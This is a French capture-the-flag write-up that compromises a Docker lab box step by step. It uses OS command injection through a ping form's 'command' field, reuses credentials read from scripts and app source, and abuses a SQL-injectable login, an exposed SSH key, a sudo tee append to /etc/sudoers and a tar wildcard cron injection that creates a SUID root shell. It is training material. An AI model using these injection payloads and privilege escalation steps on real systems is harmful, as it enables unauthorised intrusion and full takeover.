# Jedha CTF - Write-up

**Cible :** 10.10.10.83
**Difficulté :** Moyenne
**OS :** Linux (Ubuntu - Conteneur Docker)
**Date :** 20/01/2026

---

## Table des matières

1. [Reconnaissance](#reconnaissance)
2. [Énumération](#énumération)
3. [Point d'entrée - Injection de commande](#point-dentrée---injection-de-commande)
4. [Mouvement latéral - john](#mouvement-latéral---john)
5. [Mouvement latéral - bob](#mouvement-latéral---bob)
6. [Mouvement latéral - alice](#mouvement-latéral---alice)
7. [Élévation de privilèges - root](#élévation-de-privilèges---root)
8. [Privesc alternative - Tar Wildcard](#privesc-alternative---tar-wildcard)
9. [Leçons apprises](#leçons-apprises)

---

## Reconnaissance

### Scan Nmap

```bash
nmap -sC -sV -p- --min-rate=1000 10.10.10.83 -oN nmap_scan.txt
```

**Résultat du scan :**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 16:28 +0100
Nmap scan report for 10.10.10.83
Host is up (0.0073s latency).
Not shown: 65229 closed tcp ports (conn-refused), 302 filtered tcp ports (no-response)

PORT     STATE SERVICE          VERSION
21/tcp   open  ftp              vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.31.35.242 is not the same as 10.10.10.83
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.10.0
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status

22/tcp   open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e7:73:7a:df:a6:09:4b:6f:b1:b2:07:0c:29:a1:41:94 (RSA)
|   256 76:e3:f9:b9:91:2a:72:da:f1:23:84:f9:9a:c3:f2:b3 (ECDSA)
|_  256 d6:11:dd:55:03:65:82:5f:40:82:dd:21:3d:73:24:93 (ED25519)

80/tcp   open  http
|_http-title:  PINGOZAURUS
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-RateLimit-Limit: 150
|     X-RateLimit-Remaining: 149
|     Vulnerable: True
|     Content-Type: text/html; charset=utf-8

8081/tcp open  blackice-icecap?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-RateLimit-Limit: 150
|     Vulnerable: True
|     Content-Type: text/html; charset=utf-8
|     <title> Evil CORP </title>

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Résumé des ports :**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.5 (Connexion anonyme autorisée) |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | Node.js (PINGOZAURUS) |
| 8081 | HTTP    | Node.js (Evil CORP) |

**Observations clés :**
- Le FTP autorise la connexion anonyme
- Les deux applications web retournent un header suspect : `Vulnerable: True`
- Le port 80 héberge "PINGOZAURUS" - une application de test de ping
- Le port 8081 héberge "Evil CORP" - un site corporate avec un login admin

---

## Énumération

### Port 80 - PINGOZAURUS

```bash
curl -s http://10.10.10.83/ | head -60
```

**Réponse :**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> PINGOZAURUS </title>
    <link rel="icon" type="image/x-icon" href="ping.png" />
    ...
  </head>
  <body href="/">
    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="/"> PINGOzaurus</a>
        </div>
    </nav>
    <header class="masthead">
        <div class="container px-4 px-lg-5 d-flex h-100 align-items-center justify-content-center">
            <div class="d-flex justify-content-center">
                <div class="text-center">
                    <div class="container d-flex justify-content-center">
                        <div class="contact px-5 py-5 w-100">
                            <form method="POST" action="/">
                                <h4 class="text-white mb-5"> <strong> TEST THE AVAILABILITY OF YOUR WEBSITE !</strong> </h4>
                                <div class="row">
                                    <div class="col-md-12 mb-2 mt-2">
                                        <input type="text" class="form-control" placeholder="Domain or IP" name="command" />
                                    </div>
                                </div>
                                <div class="pull-left">
                                    <button class="btn btn-white mt-2 px-5" type="submit">  Ping it! </button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <p class="text-white">
                      <span>Results</span>
                      <pre style="background-color: grey; padding: 25px; border-radius: 5px;">

                      </pre>
                    </p>
                </div>
            </div>
        </div>
    </header>
  </body>
</html>
```

Le nom du paramètre `command` est très suspect et suggère une potentielle injection de commande.

### Port 8081 - Evil CORP

```bash
curl -s http://10.10.10.83:8081/ | head -50
```

**Réponse :**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> Evil CORP </title>
    <link rel="icon" type="image/x-icon" href="evil.ico" />
    ...
  </head>
  <body href="/">
    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="/"> EvilCorp</a>
            ...
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto">
                  <li class="nav-item"><a class="nav-link" href="/projects">Projects</a></li>
                  <li class="nav-item"><a class="nav-link" href="/contact">Contact</a></li>
                  <li class="nav-item"><a class="nav-link" href="/reviews">Reviews</a></li>
                  <li class="nav-item"><a class="nav-link" href="/login"> Administration </a></li>
                </ul>
            </div>
        </div>
    </nav>
    <header class="masthead">
        <div class="container px-4 px-lg-5 d-flex h-100 align-items-center justify-content-center">
            <div class="d-flex justify-content-center">
                <div class="text-center">
                    <h1 class="mx-auto my-0 text-uppercase">EvilCorp</h1>
                    <h2 class="text-white-50 mx-auto mt-2 mb-5">We create the hell of tomorrow.</h2>
                </div>
            </div>
        </div>
    </header>
  </body>
</html>
```

Site corporate avec les pages suivantes :
- `/projects` - Vitrine des projets
- `/contact` - Formulaire de contact
- `/reviews` - Avis utilisateurs
- `/login` - Panneau d'administration

### Accès FTP Anonyme

```bash
ftp -n 10.10.10.83 <<EOF
user anonymous anonymous
passive
ls -la
bye
EOF
```

**Résultat :**

```
Connected to 10.10.10.83.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Passive mode on.
227 Entering Passive Mode (172,31,35,242,156,78).
ftp: connect: Connection refused
Passive mode address mismatch.
221 Goodbye.
```

La connexion FTP a réussi mais le listing du répertoire a échoué à cause d'une incompatibilité d'IP en mode PASV. Le serveur FTP renvoie son IP interne Docker (`172.31.35.242`) au lieu de l'IP externe (`10.10.10.83`). On explorera le FTP plus tard via l'injection de commande.

---

## Point d'entrée - Injection de commande

### Test de la vulnérabilité

**Requête normale :**

```bash
curl -s -X POST http://10.10.10.83/ -d "command=127.0.0.1" | grep -A20 "Results"
```

**Résultat :**

```html
<span>Results</span>
<pre style="background-color: grey; padding: 25px; border-radius: 5px;">
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.067 ms
    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.052 ms
    64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.042 ms
    64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.046 ms

    --- 127.0.0.1 ping statistics ---
    4 packets transmitted, 4 received, 0% packet loss, time 3057ms
    rtt min/avg/max/mdev = 0.042/0.051/0.067/0.009 ms
</pre>
```

L'application exécute bien la commande `ping`. Testons l'injection avec un point-virgule :

**Test d'injection avec point-virgule :**

```bash
curl -s -X POST http://10.10.10.83/ -d "command=127.0.0.1;id" | grep -A20 "Results"
```

**Résultat :**

```html
<span>Results</span>
<pre style="background-color: grey; padding: 25px; border-radius: 5px;">
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms
    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.048 ms
    64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms
    64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.051 ms

    --- 127.0.0.1 ping statistics ---
    4 packets transmitted, 4 received, 0% packet loss, time 3109ms
    rtt min/avg/max/mdev = 0.041/0.047/0.051/0.004 ms
    uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(secretgroup)
</pre>
```

L'application est vulnérable à l'injection de commande OS. L'utilisateur `www-data` est également membre du groupe `secretgroup`.

### Énumération du système

**Liste des utilisateurs :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;ls -la /home" | grep -A20 "Results"
```

**Résultat :**

```
total 0
drwxr-xr-x 1 root  root   8 Oct 21 10:42 .
drwxr-xr-x 1 root  root  78 Jan 20 16:25 ..
drwxr-xr-x 1 alice alice  8 Oct 21 10:42 alice
drwxr-xr-x 1 bob   bob    8 Oct 21 10:42 bob
drwxr-xr-x 1 john  john  26 Oct 21 10:42 john
```

**Exploration du home de bob :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;ls -la /home/bob" | grep -A20 "Results"
```

**Résultat :**

```
total 332
drwxr-xr-x 1 bob  bob       8 Oct 21 10:42 .
drwxr-xr-x 1 root root      8 Oct 21 10:42 ..
lrwxrwxrwx 1 root root      9 Oct 21 10:42 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bob  bob    3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 bob  bob     807 Feb 25  2020 .profile
-rwsrwsr-- 1 root bob  320160 Jun 10  2025 find
```

Un binaire `find` avec SUID root ! Mais les permissions `-rwsrwsr--` indiquent que seul le groupe `bob` peut l'exécuter.

**Exploration du home de john :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;ls -la /home/john" | grep -A20 "Results"
```

**Résultat :**

```
total 20
drwxr-xr-x 1 john john   26 Oct 21 10:42 .
drwxr-xr-x 1 root root    8 Oct 21 10:42 ..
-rw-rw-r-- 1 john john  246 Jan 20 16:30 .bash_history
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
-r--r--r-- 1 root root  265 Jun 10  2025 notes.txt
```

John a un `.bash_history` lisible et un fichier `notes.txt`.

**Lecture de notes.txt :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;cat /home/john/notes.txt" | grep -A20 "Results"
```

**Résultat :**

```
Hi friend,

Congratulations, you passed the first step. 😉😉

Feel free to write whatever you want in your home directory, it's yours.
Don't be afraid, everything is backed up very often. Be reassured, I do it myself.

See you soon at the cocktail party,
Root
```

Indice : les backups sont faits "très souvent" par root lui-même...

**Lecture de .bash_history de john :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;cat /home/john/.bash_history" | grep -A30 "Results"
```

**Résultat :**

```
whoami
ls
pwd
cat notes.txt
pwd
mkdir test
echo "ssh ?" > test/ssh
rm test
rm -rf test/ssh
cat /run/john-script.sh
bash /run/john-script.sh
ls -al
cat /run/john-script.sh
cat ~/sshpass.txt
whoami
ls
rm -rf test
pwd
echo "It works !"
history
exit
```

L'historique révèle l'existence de `/run/john-script.sh` et `~/sshpass.txt`.

---

## Mouvement latéral - john

### Découverte des identifiants

**Lecture du script /run/john-script.sh :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;cat /run/john-script.sh" | grep -A20 "Results"
```

**Résultat :**

```bash
#!/bin/bash

USERNAME="john"
PASSWD="peterpan"

sshpass -p $PASSWD ssh $USERNAME@127.0.0.1 'echo "Testing sshpass tool. It is awesome !!" > ~/sshpass.txt'
```

Identifiants trouvés : `john:peterpan`

**Vérification des permissions du script :**

```bash
curl -s -X POST http://10.10.10.83/ --data-urlencode "command=127.0.0.1;ls -la /run/john-script.sh" | grep -A5 "Results"
```

**Résultat :**

```
-rw-r----- 1 john secretgroup 155 Jun 10  2025 john-script.sh
```

Le fichier appartient à `john:secretgroup`. Comme `www-data` est membre de `secretgroup`, on peut le lire.

### Accès SSH en tant que john

```bash
sshpass -p 'peterpan' ssh john@10.10.10.83
```

**Résultat :**

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.12.6-orbstack-00304-gd5c558edb015 aarch64)

Last login: Mon Jan 20 16:37:42 2026 from 10.10.10.0
john@e570023bd77f:~$ id
uid=1002(john) gid=1002(john) groups=1002(john),1003(secretgroup)
```

---

## Mouvement latéral - bob

### Analyse du code source d'Evil CORP

En tant que john, on peut lire le code source de l'application web :

```bash
john@box:~$ cat /opt/evil-web-app/index.js
```

**Code source (extraits pertinents) :**

```javascript
require('dotenv').config()

// Dependencies
const rateLimiter = require('express-rate-limit');
const bodyParser = require('body-parser');
const express = require('express');
const mysql = require('mysql');
const path = require('path');
const ejs = require('ejs');

// Port
const port = process.env.PORT || 8081;

// Initialize
const app = express();

// MySQL config
const database = mysql.createConnection({
    host: "127.0.0.1",
    user: "jedha",
    password: "mkiFDUAWqVbSFFk23nK",
    database: "EvilCorp"
})

const databaseRenew = () => {
    console.info('[' + new Date() + '] Renewing table admin');

    database.query(`DROP TABLE IF EXISTS admin ;`)
    database.query(`CREATE TABLE admin (username varchar(255), password varchar(255));`);
    database.query(`INSERT INTO admin VALUES ('evil', 'VeryStr0ngP4ssw0rd');`)

    console.info('[' + new Date() + '] Renewing table reviews');

    database.query(`DROP TABLE IF EXISTS reviews;`)
    database.query(`CREATE TABLE reviews (name varchar(255), subject text, message text);`)
    database.query(`INSERT INTO reviews VALUES ('Username : evil', 'Great work!', 'Your project is definitely incredible, I LOVE IT');`)
    database.query(`INSERT INTO reviews VALUES ('Username : john', 'Just wow!', 'Incredible job, I LOVE IT');`)
    database.query(`INSERT INTO reviews VALUES ('Username : admin', 'This is time!', 'We are very proud to launch our new evil project !');`)
}

// SQL Sanitizer (utilisé pour /reviews)
const sanitize = (str) => {
    return str.replace(/[\0\x08\x09\x1a\n\r"'\\\%]/g, function (char) {
        switch (char) {
            case "\"":
            case "'":
            case "\\":
            case "%":
                return "\\"+char;
            default:
                return char;
        }
    });
}

// Route /login - VULNÉRABLE À L'INJECTION SQL !
app.post('/login', (req, res) => {
    database.query(`SELECT * FROM admin WHERE username='` + req.body.username + `' AND password='` + req.body.password + `';`, (error, result) => {
        if (error) {
            res.render('evil-admin', {
                error: true,
            });
        }
        else if (!result.length) {
            res.render('evil-admin', {
                invalid: true,
            });
        }
        else {
            res.render('evil-secret');
        }
    });
});
```

**Découvertes clés :**

1. **Identifiants MySQL :**
   - User : `jedha`
   - Password : `mkiFDUAWqVbSFFk23nK`
   - Database : `EvilCorp`

2. **Identifiants admin (codés en dur dans l'initialisation de la DB) :**
   - Username : `evil`
   - Password : `VeryStr0ngP4ssw0rd`

3. **Injection SQL dans la route /login :**
   Le endpoint `/login` concatène directement les entrées utilisateur dans la requête SQL, contrairement à `/reviews` qui utilise la fonction `sanitize()`.

### Exploitation du login

```bash
curl -s -X POST http://10.10.10.83:8081/login -d "username=evil&password=VeryStr0ngP4ssw0rd"
```

**Résultat (page secrète) :**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> Evil CORP </title>
    ...
  </head>
  <body href="/">
    ...
    <section class="projects-section bg-light" id="projects">
        <div class="container px-4 px-lg-5">
        <section class="mb-4">
            <h2 class="h1-responsive font-weight-bold text-center my-4">Welcome back!</h2>
            <img src="/img/secret-ingredient.png">
            <h2 class="h1-responsive font-weight-bold text-center my-4">
                <br/><br/>
                <u>Note for bob</u><br/>
                Here is your new password : xNfE98RSsa<br/>
                Please, do not forget it again !<br/>
                -- Admin --
            </h2>
        </section>
        </div>
    </section>
    ...
  </body>
</html>
```

Mot de passe de bob trouvé : `xNfE98RSsa`

### Accès SSH en tant que bob

```bash
sshpass -p 'xNfE98RSsa' ssh bob@10.10.10.83
```

**Résultat :**

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.12.6-orbstack-00304-gd5c558edb015 aarch64)

Last login: Mon Jan 20 16:38:15 2026 from 10.10.10.0
bob@e570023bd77f:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

**Note :** bob possède un binaire `find` SUID dans son répertoire home, mais il est compilé pour l'architecture x86_64 :

```bash
bob@box:~$ /home/bob/find . -exec id \;
OrbStack ERROR: Dynamic loader not found: /lib64/ld-linux-x86-64.so.2

This usually means that you're running an x86 program on an arm64 OS without multi-arch libraries.
```

Le binaire ne fonctionne pas sur ce système arm64.

---

## Mouvement latéral - alice

### Exploration FTP

Maintenant qu'on a un accès SSH, on peut explorer le répertoire FTP :

```bash
john@box:~$ ls -la /var/ftp/
```

**Résultat :**

```
total 0
drwxr-xr-x 1 root   root    10 Oct 21 10:42 .
drwxr-xr-x 1 root   root    12 Oct 21 10:42 ..
drwxr-xr-x 1 nobody nogroup 10 Oct 21 10:42 alice
```

```bash
john@box:~$ ls -la /var/ftp/alice/files/
```

**Résultat :**

```
total 6136
drwxr-xr-x 1 nobody nogroup     142 Oct 21 10:42 .
drwxr-xr-x 1 nobody nogroup      10 Oct 21 10:42 ..
-r-xr-xr-x 1 root   root    5865554 Jun 10  2025 Les-bases-du-hacking.pdf
-r-xr-xr-x 1 root   root       2602 Jun 10  2025 id_rsa
-r-xr-xr-x 1 root   root     295612 Jun 10  2025 outil_scan_deports.pdf
-r-xr-xr-x 1 root   root     110168 Jun 10  2025 r2014_05_topics.pdf
```

Une clé SSH privée `id_rsa` !

### Extraction de la clé SSH

```bash
john@box:~$ cat /var/ftp/alice/files/id_rsa
```

**Résultat :**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1+ZfYrixBFu5Rogc5zeBZTaNySFlVnW0q0V/0f7eELtCSHCKvcJb
RRfPdfF2K8ukbwme0mMoLWMh4EgvLdgvueDjfijgwPX9E0Z3DdheF6aBTvni44ab0SYS0T
8c+VJUjllh4I+qoD7GrJZq4U0jQkxykIgGco5Chxzu6OHzUoli6WN0euuOUzkwizIK8i+1
r5VHctPLG774lF+J2u5cH2fhbCvCxNKqZp3F6/JSqmZjTIyywMOtOFvmn3w/sKkOcsVzYz
... (tronqué pour la lisibilité)
-----END OPENSSH PRIVATE KEY-----
```

### Accès SSH en tant qu'alice

```bash
# Sauvegarder la clé localement
cat /var/ftp/alice/files/id_rsa > /tmp/alice_key
chmod 600 /tmp/alice_key

# Connexion
ssh -i /tmp/alice_key alice@10.10.10.83
```

**Résultat :**

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.12.6-orbstack-00304-gd5c558edb015 aarch64)

Last login: Mon Jan 20 16:39:12 2026 from 10.10.10.0
alice@e570023bd77f:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```

---

## Élévation de privilèges - root

### Énumération sudo

```bash
alice@box:~$ sudo -l
```

**Résultat :**

```
Matching Defaults entries for alice on e570023bd77f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alice may run the following commands on e570023bd77f:
    (ALL : ALL) NOPASSWD: /usr/bin/tee -a *
```

Alice peut ajouter du contenu à n'importe quel fichier en tant que root avec `tee -a`.

### Exploitation

**Méthode : Ajouter alice à sudoers avec tous les privilèges**

```bash
alice@box:~$ echo "alice ALL=(ALL) NOPASSWD: ALL" | sudo /usr/bin/tee -a /etc/sudoers
```

**Résultat :**

```
alice ALL=(ALL) NOPASSWD: ALL
```

### Accès root

```bash
alice@box:~$ sudo su
root@e570023bd77f:/home/alice# id
uid=0(root) gid=0(root) groups=0(root)

root@e570023bd77f:/home/alice# whoami
root

root@e570023bd77f:/home/alice# cat /etc/shadow | head -3
root:*:20182:0:99999:7:::
daemon:*:20182:0:99999:7:::
bin:*:20182:0:99999:7:::
```

---

## Privesc alternative - Tar Wildcard

### Découverte de la tâche cron

```bash
john@box:~$ cat /etc/crontab
```

**Résultat :**

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


# ADMINISTRATION SERVER - DO NOT TOUCH
*/30 *  * * *	root	cp /usr/share/.john_bash_history.bak /home/john/.bash_history && chown john:john /home/john/.bash_history && chmod 664 /home/john/.bash_history
*/30 *  * * *	root	cp /usr/share/.sudoers.bak /etc/sudoers && chown root:root /etc/sudoers && chmod 440 /etc/sudoers


# PROJET
*/5  *  * * *   root    cd /home/john/ && tar -zcf /home-john-backup.tgz *
```

Toutes les 5 minutes, root exécute `tar -zcf /home-john-backup.tgz *` dans `/home/john/`.

### Injection via Tar Wildcard

C'est une technique classique d'élévation de privilèges. Quand `tar` rencontre des fichiers nommés comme des options de ligne de commande, il les interprète comme telles.

**Création du payload (en tant que john) :**

```bash
john@box:~$ # Créer le script malveillant
john@box:~$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /home/john/shell.sh
john@box:~$ chmod +x /home/john/shell.sh

john@box:~$ # Créer les fichiers "options"
john@box:~$ touch "/home/john/--checkpoint=1"
john@box:~$ touch "/home/john/--checkpoint-action=exec=sh shell.sh"

john@box:~$ # Vérification
john@box:~$ ls -la /home/john/
total 24
-rw-rw-r-- 1 john john    0 Jan 20 16:38 --checkpoint-action=exec=sh shell.sh
-rw-rw-r-- 1 john john    0 Jan 20 16:38 --checkpoint=1
drwxr-xr-x 1 john john  154 Jan 20 16:38 .
drwxr-xr-x 1 root root   14 Oct 21 10:42 ..
-rw-rw-r-- 1 john john  246 Jan 20 16:30 .bash_history
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Feb 25  2020 .bashrc
drwx------ 1 john john   40 Jan 20 16:37 .cache
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
-r--r--r-- 1 root root  265 Jun 10  2025 notes.txt
-rwxrwxr-x 1 john john   53 Jan 20 16:38 shell.sh
```

**Comment ça fonctionne :**

Quand cron exécute :
```bash
cd /home/john/ && tar -zcf /home-john-backup.tgz *
```

Le shell étend le wildcard `*` et la commande devient :
```bash
tar -zcf /home-john-backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh notes.txt shell.sh .bash_history ...
```

L'option `--checkpoint-action=exec=sh shell.sh` force tar à exécuter notre script `shell.sh` en tant que root.

### Résultat

Après avoir attendu la tâche cron (max 5 minutes) :

```bash
john@box:~$ ls -la /tmp/
total 1192
drwxrwxrwt 1 root root      16 Jan 20 16:40 .
drwxr-xr-x 1 root root      78 Jan 20 16:25 ..
-rwsr-sr-x 1 root root 1219168 Jan 20 16:40 rootbash

john@box:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1002(john) gid=1002(john) euid=0(root) egid=0(root) groups=0(root),1002(john),1003(secretgroup)

rootbash-5.0# whoami
root
```

---


## Résumé du chemin d'attaque

```
Internet
    │
    ▼
[Injection de commande - Port 80]
    │
    ▼
www-data (secretgroup)
    │
    ├──[Lecture /run/john-script.sh]──► john:peterpan
    │                                       │
    │                                       ▼
    │                                  [Lecture code source]
    │                                       │
    │                                       ▼
    │                                  evil:VeryStr0ngP4ssw0rd
    │                                       │
    │                                       ▼
    │                                  [Login Evil CORP]
    │                                       │
    │                                       ▼
    │                                  bob:xNfE98RSsa
    │
    └──[Lecture fichiers FTP]─────────► alice (via clé SSH)
                                            │
                                            ▼
                                       [sudo tee -a *]
                                            │
                                            ▼
                                          ROOT
```

---

## Outils utilisés

- nmap
- curl
- ssh / sshpass
- Client MySQL

## Références

- [GTFOBins - tee](https://gtfobins.github.io/gtfobins/tee/)
- [GTFOBins - tar](https://gtfobins.github.io/gtfobins/tar/)
- [Injection Tar Wildcard](https://www.exploit-db.com/papers/33930)
